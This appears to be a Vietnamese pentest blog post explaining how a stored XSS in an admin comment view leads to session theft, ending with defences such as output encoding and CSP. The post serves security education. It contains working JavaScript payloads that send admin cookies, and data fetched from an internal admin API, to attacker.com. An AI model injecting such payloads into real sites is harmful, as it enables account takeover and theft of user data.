---
title: "Từ stored XSS đến đánh cắp phiên đăng nhập"
date: 2026-01-28T20:40:00+07:00
draft: false
description: "Chain tấn công stored XSS trong phần comment để lấy session của admin."
featuredImage: "/img/blowfish_logo_hu_7616dac984edb1e7.png"

categories: ["Pentest", "Web Application"]
tags: ["xss", "stored-xss", "session", "cookie-stealing"]

showTableOfContents: true
showAuthor: true
showDate: true
showReadingTime: true
---

## 1. Kịch bản

Ứng dụng có tính năng comment cho từng bài viết.  
Admin thường xuyên login và duyệt comment từ giao diện backend, nhưng comment lại được render **chung template** với frontend.

## 2. Tìm điểm XSS

Form comment:

```html
<textarea name="content"></textarea>
```

Khi gửi payload:

```html
<script>alert(1)</script>
```

Frontend tự filter, nhưng backend khi render lại trong trang admin thì:

```html
<div class="comment-body">
  {{ comment.content | safe }}
</div>
```

Không hề escape → **stored XSS** kích hoạt khi admin xem comment.

## 3. Từ alert(1) đến session steal

Payload thực tế sẽ không dùng `alert(1)` mà:

```html
<script>
  new Image().src = "https://attacker.com/log?c=" + encodeURIComponent(document.cookie);
</script>
```

Hoặc nếu `HttpOnly` được set đúng, ta có thể:

- Lợi dụng context để thao tác DOM, gửi request CSRF-like.
- Inject JavaScript để call các API nội bộ mà chỉ admin dùng.

Ví dụ gọi API lấy danh sách user:

```js
fetch('/admin/api/users', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/log', {
    method: 'POST',
    body: d
  }));
```

## 4. Phòng chống

- Escape toàn bộ output user input bằng **HTML-encoding**.
- Chỉ cho phép một subset an toàn (markdown, bbcode…) và sanitize kỹ.
- Bật **CSP (Content Security Policy)** để hạn chế script inline.

## 5. Kết luận

Stored XSS trong khu vực admin nguy hiểm hơn rất nhiều so với public vì:

- Attack surface ít người chạm vào nên hay bị bỏ sót.
- Impact thường là **full admin compromise** hoặc **data exfiltration**.

Khi pentest, đừng chỉ test XSS ở phía client, hãy luôn hỏi:

> “Payload này có được render lại ở một view khác không? Đặc biệt là view dành cho admin?”

